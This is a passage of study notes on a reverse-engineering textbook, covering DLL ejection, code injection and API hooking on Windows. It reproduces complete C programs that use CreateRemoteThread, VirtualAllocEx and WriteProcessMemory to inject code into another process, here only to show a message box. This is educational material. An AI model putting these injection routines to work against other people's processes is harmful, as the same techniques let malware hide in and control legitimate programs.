plaintext">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows<br></code></pre></td></tr></table></figure><h3 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx()"></a>SetWindowsHookEx()</h3><h1 id="Chapter-24-DLL-Ejection"><a href="#Chapter-24-DLL-Ejection" class="headerlink" title="Chapter 24 - DLL Ejection"></a>Chapter 24 - DLL Ejection</h1><p>This technique is similar to DLL injection. Instead of using <code>LoadLibrary()</code> to load a DLL, we use <code>FreeLibrary()</code> to unload a DLL via <code>CreateRemoteThread()</code>.</p><p>Every Windows kernel object has a <strong>reference count</strong>, which indicates how many references to the object currently exist. For example, the reference count of <code>a.dll</code> becomes 10 if <code>LoadLibrary(&quot;a.dll&quot;)</code> is called 10 times. Accordingly, <code>FreeLibrary()</code> must be called 10 times to fully unload <code>a.dll</code>.</p><p>The reference count is decreased by 1 whenever <code>FreeLibrary()</code> is called. Therefore, we need to pay attention to the value of the <strong>reference count</strong>.</p><h1 id="Chapter-25-Load-DLL-File-by-Modifying-the-PE-File"><a href="#Chapter-25-Load-DLL-File-by-Modifying-the-PE-File" class="headerlink" title="Chapter 25 - Load DLL File by Modifying the PE File"></a>Chapter 25 - Load DLL File by Modifying the PE File</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// EjectDll.exe<br><br>#include &quot;windows.h&quot;<br>#include &quot;tlhelp32.h&quot;<br>#include &quot;tchar.h&quot;<br><br>#define DEF_PROC_NAME(L&quot;notepad.exe&quot;)<br>#define DEF_DLL_NAME(L&quot;myhack.dll&quot;)<br><br>DWORD FindProcessID(LPCTSTR szProcessName)<br>&#123;<br>    DWORD dwPID = 0xFFFFFFFF;<br>    HANDLE hSnapShot = INVALID_HANDLE_VALUE;<br>    PROCESSENTRY32 pe;<br><br>    // Get the snapshot of the system<br>    pe.dwSize = sizeof( PROCESSENTRY32 );<br>    hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );<br><br>    // find process<br>    Process32First(hSnapShot, &amp;pe);<br>    do<br>    &#123;<br>        if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile))<br>        &#123;<br>            dwPID = pe.th32ProcessID;<br>            break;<br>        &#125;<br>    &#125;<br>    while(Process32Next(hSnapShot, &amp;pe));<br><br>    CloseHandle(hSnapShot);<br><br>    return dwPID;<br>&#125;<br><br>BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) <br>&#123;<br>    TOKEN_PRIVILEGES tp;<br>    HANDLE hToken;<br>    LUID luid;<br><br>    if( !OpenProcessToken(GetCurrentProcess(),<br>                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, <br>              &amp;hToken) )<br>    &#123;<br>        _tprintf(L&quot;OpenProcessToken error: %u\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    if( !LookupPrivilegeValue(NULL,           // lookup privilege on local system<br>                              lpszPrivilege,  // privilege to lookup <br>                              &amp;luid) )        // receives LUID of privilege<br>    &#123;<br>        _tprintf(L&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() ); <br>        return FALSE; <br>    &#125;<br><br>    tp.PrivilegeCount = 1;<br>    tp.Privileges[0].Luid = luid;<br>    if( bEnablePrivilege )<br>        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;<br>    else<br>        tp.Privileges[0].Attributes = 0;<br><br>    // Enable the privilege or disable all privileges.<br>    if( !AdjustTokenPrivileges(hToken, <br>                               FALSE, <br>                               &amp;tp, <br>                               sizeof(TOKEN_PRIVILEGES), <br>                               (PTOKEN_PRIVILEGES) NULL, <br>                               (PDWORD) NULL) )<br>    &#123; <br>        _tprintf(L&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() ); <br>        return FALSE; <br>    &#125; <br><br>    if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )<br>    &#123;<br>        _tprintf(L&quot;The token does not have the specified privilege. \n&quot;);<br>        return FALSE;<br>    &#125; <br><br>    return TRUE;<br>&#125;<br><br>BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName)<br>&#123;<br>    BOOL bMore = FALSE, bFound = FALSE;<br>    HANDLE hSnapshot, hProcess, hThread;<br>    HMODULE hModule = NULL;<br>    MODULEENTRY32 me = &#123; sizeof(me) &#125;;<br>    LPTHREAD_START_ROUTINE pThreadProc;<br><br>    // dwPID = notepad 프로세스 ID<br>    // TH32CS_SNAPMODULE 파라미터를 이용해서 notepad 프로세스에 로딩된 DLL 이름을 얻음<br>    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);<br><br>    bMore = Module32First(hSnapshot, &amp;me);<br>    for( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) )<br>    &#123;<br>        if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || <br>            !_tcsicmp((LPCTSTR)me.szExePath, szDllName) )<br>        &#123;<br>            bFound = TRUE;<br>            break;<br>        &#125;<br>    &#125;<br><br>    if( !bFound )<br>    &#123;<br>        CloseHandle(hSnapshot);<br>        return FALSE;<br>    &#125;<br><br>    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )<br>    &#123;<br>        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    hModule = GetModuleHandle(L&quot;kernel32.dll&quot;);<br>    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;FreeLibrary&quot;);<br>    hThread = CreateRemoteThread(hProcess, NULL, 0, <br>                                 pThreadProc, me.modBaseAddr, <br>                                 0, NULL);<br>    WaitForSingleObject(hThread, INFINITE);<br><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br>    CloseHandle(hSnapshot);<br><br>    return TRUE;<br>&#125;<br><br>int _tmain(int argc, TCHAR* argv[])<br>&#123;<br>    DWORD dwPID = 0xFFFFFFFF;<br> <br>    // find process<br>    dwPID = FindProcessID(DEF_PROC_NAME);<br>    if( dwPID == 0xFFFFFFFF )<br>    &#123;<br>        _tprintf(L&quot;There is no &lt;%s&gt; process!\n&quot;, DEF_PROC_NAME);<br>        return 1;<br>    &#125;<br><br>    _tprintf(L&quot;PID of \&quot;%s\&quot; is %d\n&quot;, DEF_PROC_NAME, dwPID);<br><br>    // change privilege<br>    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )<br>        return 1;<br><br>    // eject dll<br>    if( EjectDll(dwPID, DEF_DLL_NAME) )<br>        _tprintf(L&quot;EjectDll(%d, \&quot;%s\&quot;) success!!!\n&quot;, dwPID, DEF_DLL_NAME);<br>    else<br>        _tprintf(L&quot;EjectDll(%d, \&quot;%s\&quot;) failed!!!\n&quot;, dwPID, DEF_DLL_NAME);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct tagMODULEENTRY32 &#123;<br>    DWORD   dwSize;<br>    DWORD   th32ModuleID;<br>    DWORD   th32ProcessID;<br>    DWORD   GlblcntUsage;<br>    DWORD   ProccntUsage;<br>    BYTE    *modBaseAddr;<br>    DWORD   modBaseSize;<br>    HMODULE hModule;<br>    char    szModule[MAX_MODULE_NAME32 + 1];<br>    char    szExePath[MAX_PATH];<br>&#125; MODULEENTRY32;<br></code></pre></td></tr></table></figure><h1 id="Chapter-26-PE-Tools"><a href="#Chapter-26-PE-Tools" class="headerlink" title="Chapter 26 - PE Tools"></a>Chapter 26 - PE Tools</h1><h1 id="Chapter-27-Code-Injection"><a href="#Chapter-27-Code-Injection" class="headerlink" title="Chapter 27 - Code Injection"></a>Chapter 27 - Code Injection</h1><h2 id="27-4-CodeInjection-cpp"><a href="#27-4-CodeInjection-cpp" class="headerlink" title="27.4 - CodeInjection.cpp"></a>27.4 - CodeInjection.cpp</h2><p><strong>MsgBox()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//MsgBox.cpp<br><br>#include &quot;windows.h&quot;<br><br>DWORD WINAPI ThreadProc(LPVOID lParam)<br>&#123;<br>    MessageBoxA(NULL, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;, MB_OK);<br><br>    return 0;<br>&#125;<br><br>BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)<br>&#123;<br>    switch( fdwReason )<br>    &#123;<br>        case DLL_PROCESS_ATTACH : <br>            CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);<br>            break;<br>    &#125;<br><br>    return TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><br><strong>main()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int main(int argc, char *argv[])<br>&#123;<br>    DWORD dwPID     = 0;<br><br>if( argc != 2 )<br>&#123;<br>    printf(&quot;\n USAGE  : %s &lt;pid&gt;\n&quot;, argv[0]);<br>return 1;<br>&#125;<br><br>// change privilege<br>if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )<br>        return 1;<br><br>    // code injection<br>    dwPID = (DWORD)atol(argv[1]);<br>    InjectCode(dwPID);<br><br>return 0;<br>&#125;<br></code></pre></td></tr></table></figure><br><strong>ThreadProc()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _THREAD_PARAM <br>&#123;<br>    FARPROC pFunc[2];               // LoadLibraryA(), GetProcAddress()<br>    char    szBuf[4][128];          // &quot;user32.dll&quot;, &quot;MessageBoxA&quot;, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;<br>&#125; THREAD_PARAM, *PTHREAD_PARAM;<br><br>typedef HMODULE (WINAPI *PFLOADLIBRARYA)<br>(<br>    LPCSTR lpLibFileName<br>);<br><br>typedef FARPROC (WINAPI *PFGETPROCADDRESS)<br>(<br>    HMODULE hModule,<br>    LPCSTR lpProcName<br>);<br><br>typedef int (WINAPI *PFMESSAGEBOXA)<br>(<br>    HWND hWnd,<br>    LPCSTR lpText,<br>    LPCSTR lpCaption,<br>    UINT uType<br>);<br><br>DWORD WINAPI ThreadProc(LPVOID lParam)<br>&#123;<br>    PTHREAD_PARAM   pParam      = (PTHREAD_PARAM)lParam;<br>    HMODULE         hMod        = NULL;<br>    FARPROC         pFunc       = NULL;<br><br>    // LoadLibrary()<br>    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]);    // &quot;user32.dll&quot;<br>    if( !hMod )<br>        return 1;<br><br>    // GetProcAddress()<br>    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]);  // &quot;MessageBoxA&quot;<br>    if( !pFunc )<br>        return 1;<br><br>    // MessageBoxA()<br>    ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><br><strong>InjectCode()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL InjectCode(DWORD dwPID)<br>&#123;<br>    HMODULE         hMod            = NULL;<br>    THREAD_PARAM    param           = &#123;0,&#125;;<br>    HANDLE          hProcess        = NULL;<br>    HANDLE          hThread         = NULL;<br>    LPVOID          pRemoteBuf[2]   = &#123;0,&#125;;<br>    DWORD           dwSize          = 0;<br><br>    hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);<br><br>    // set THREAD_PARAM<br>    param.pFunc[0] = GetProcAddress(hMod, &quot;LoadLibraryA&quot;);<br>    param.pFunc[1] = GetProcAddress(hMod, &quot;GetProcAddress&quot;);<br>    strcpy_s(param.szBuf[0], &quot;user32.dll&quot;);<br>    strcpy_s(param.szBuf[1], &quot;MessageBoxA&quot;);<br>    strcpy_s(param.szBuf[2], &quot;www.reversecore.com&quot;);<br>    strcpy_s(param.szBuf[3], &quot;ReverseCore&quot;);<br><br>    // Open Process<br>    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS,   // dwDesiredAccess<br>                                  FALSE,                // bInheritHandle<br>                                  dwPID)) )             // dwProcessId<br>    &#123;<br>        printf(&quot;OpenProcess() fail : err_code = %d\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    // Allocation for THREAD_PARAM<br>    dwSize = sizeof(THREAD_PARAM);<br>    if( !(pRemoteBuf[0] = VirtualAllocEx(hProcess,          // hProcess<br>                                      NULL,                 // lpAddress<br>                                      dwSize,               // dwSize<br>                                      MEM_COMMIT,           // flAllocationType<br>                                      PAGE_READWRITE)) )    // flProtect<br>    &#123;<br>        printf(&quot;VirtualAllocEx() fail : err_code = %d\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    if( !WriteProcessMemory(hProcess,                       // hProcess<br>                            pRemoteBuf[0],                  // lpBaseAddress<br>                            (LPVOID)&amp;param,                 // lpBuffer<br>                            dwSize,                         // nSize<br>                            NULL) )                         // [out] lpNumberOfBytesWritten<br>    &#123;<br>        printf(&quot;WriteProcessMemory() fail : err_code = %d\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    // Allocation for ThreadProc()<br>    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;<br>    if( !(pRemoteBuf[1] = VirtualAllocEx(hProcess,          // hProcess<br>                                      NULL,                 // lpAddress<br>                                      dwSize,               // dwSize<br>                                      MEM_COMMIT,           // flAllocationType<br>                                      PAGE_EXECUTE_READWRITE)) )    // flProtect<br>    &#123;<br>        printf(&quot;VirtualAllocEx() fail : err_code = %d\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    if( !WriteProcessMemory(hProcess,                       // hProcess<br>                            pRemoteBuf[1],                  // lpBaseAddress<br>                            (LPVOID)ThreadProc,             // lpBuffer<br>                            dwSize,                         // nSize<br>                            NULL) )                         // [out] lpNumberOfBytesWritten<br>    &#123;<br>        printf(&quot;WriteProcessMemory() fail : err_code = %d\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    if( !(hThread = CreateRemoteThread(hProcess,            // hProcess<br>                                       NULL,                // lpThreadAttributes<br>                                       0,                   // dwStackSize<br>                                       (LPTHREAD_START_ROUTINE)pRemoteBuf[1],     // dwStackSize<br>                                       pRemoteBuf[0],       // lpParameter<br>                                       0,                   // dwCreationFlags<br>                                       NULL)) )             // lpThreadId<br>    &#123;<br>        printf(&quot;CreateRemoteThread() fail : err_code = %d\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    WaitForSingleObject(hThread, INFINITE);<br><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br><br>    return TRUE;<br>&#125;<br><br>BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) <br>&#123;<br>    TOKEN_PRIVILEGES tp;<br>    HANDLE hToken;<br>    LUID luid;<br><br>    if( !OpenProcessToken(GetCurrentProcess(),<br>                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, <br>              &amp;hToken) )<br>    &#123;<br>        printf(&quot;OpenProcessToken error: %u\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    if( !LookupPrivilegeValue(NULL,           // lookup privilege on local system<br>                              lpszPrivilege,  // privilege to lookup <br>                              &amp;luid) )        // receives LUID of privilege<br>    &#123;<br>        printf(&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() ); <br>        return FALSE; <br>    &#125;<br><br>    tp.PrivilegeCount = 1;<br>    tp.Privileges[0].Luid = luid;<br>    if( bEnablePrivilege )<br>        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;<br>    else<br>        tp.Privileges[0].Attributes = 0;<br><br>    // Enable the privilege or disable all privileges.<br>    if( !AdjustTokenPrivileges(hToken, <br>                               FALSE, <br>                               &amp;tp, <br>                               sizeof(TOKEN_PRIVILEGES), <br>                               (PTOKEN_PRIVILEGES) NULL, <br>                               (PDWORD) NULL) )<br>    &#123; <br>        printf(&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() ); <br>        return FALSE; <br>    &#125; <br><br>    if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )<br>    &#123;<br>        printf(&quot;The token does not have the specified privilege. \n&quot;);<br>        return FALSE;<br>    &#125; <br><br>    return TRUE;<br>&#125;<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-28-Code-Injection-via-Assembly-Code"><a href="#Chapter-28-Code-Injection-via-Assembly-Code" class="headerlink" title="Chapter 28 - Code Injection via Assembly Code"></a>Chapter 28 - Code Injection via Assembly Code</h1><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/28.1.png'><img src="/images/books/ReverseEngineeringCore/28.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/28.2.png'><img src="/images/books/ReverseEngineeringCore/28.2.png" width="700"></p><h1 id="Chapter-29-API-Hooking"><a href="#Chapter-29-API-Hooking" class="headerlink" title="Chapter 29 - API Hooking"></a>Chapter 29 - API Hooking</h1><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/29.1.png'><img src="/images/books/ReverseEngineeringCore/29.1.png" width="700">    <figcaption>    Source: https://maple19out.tistory.com/45    </figcaption></p><h1 id="Chapter-30-API-Hooking-of-Notepad-exe-WriteFile"><a href="#Chapter-30-API-Hooking-of-Notepad-exe-WriteFile" class="headerlink" title="Chapter 30 - API Hooking of Notepad.exe WriteFile()"></a>Chapter 30 - API Hooking of <code>Notepad.exe</code> WriteFile()</h1><h2 id="Debug-Events"><a href="#Debug-Events" class="headerlink" title="Debug Events"></a>Debug Events</h2><ul><li>EXCEPTION_DEBUG_EVENT</li><li>CREATE_THREAD_DEBUG_EVENT</li><li>CREATE_PROCESS_DEBUG_EVENT</li><li>EXIT_THREAD_DEBUG_EVENT</li><li>EXIT_PROCESS_DEBUG_EVENT</li><li>LOAD_DLL_DEBUG_EVENT</li><li>UNLOAD_DLL_DEBUG_EVENT</li><li>OUTPUT_DEBUT_STRING_EVENT</li><li>RIP_EVENT</li></ul><h2 id="EXCEPTION-DEBUG-EVENT"><a href="#EXCEPTION-DEBUG-EVENT" class="headerlink" title="EXCEPTION_DEBUG_EVENT"></a>EXCEPTION_DEBUG_EVENT</h2><ul><li>EXCEPTION_ACCESS_VIOLATION</li><li>EXCEPTION_ARRAY_BOUNDS_EXCEEDED</li><li>EXCEPTION_BREAKPOINT</li><li>EXCEPTION_DATATYPE_MISALIGNMENT</li><li>EXCEPTION_FLT_DENORMAL_OPERAND</li><li>EXCEPTION_FLT_DIVIDE_BY_ZERO</li><li>EXCEPTION_FLT_INEXACT_RESULT</li><li>EXCEPTION_FLT_INVALID_OPERATION</li><li>EXCEPTION_FLT_OVERFLOW</li><li>EXCEPTION_FLT_STACK_CHECK</li><li>EXCEPTION_FLT_UNDERFLOW</li><li>EXCEPTION_FLT_ILLEGAL_INSTRUCTIOIN</li><li>EXCEPTION_IN_PAGE_ERROR</li><li>EXCEPTION_INT_DIVIDE_BY_ZERO</li><li>EXCEPTION_INT_OVERFLOW</li><li>EXCEPTION_INVALID_DISPOSITION</li><li>EXCEPTION_NONCONTINUABLE_EXCEPTION</li><li>EXCEPTION_PRIV_INSTRUCTION</li><li>EXCEPTION_SINGLE_STEP</li><li>EXCEPTION_STACK_OVERFLOW</li></ul><h2 id="30-4-Practice"><a href="#30-4-Practice" class="headerlink" title="30.4 - Practice"></a>30.4 - Practice</h2><h2 id="30-5-Principle"><a href="#30-5-Principle" class="headerlink" title="30.5 - Principle"></a>30.5 - Principle</h2><p><strong>WriteFile()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL WriteFile(<br>  [in]                HANDLE       hFile,<br>  [in]                LPCVOID      lpBuffer,<br>  [in]                DWORD        nNumberOfBytesToWrite,<br>  [out, optional]     LPDWORD      lpNumberOfBytesWritten,<br>  [in, out, optional] LPOVERLAPPED lpOverlapped<br>);<br></code></pre></td></tr></table></figure></p><hr><p><strong>main()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 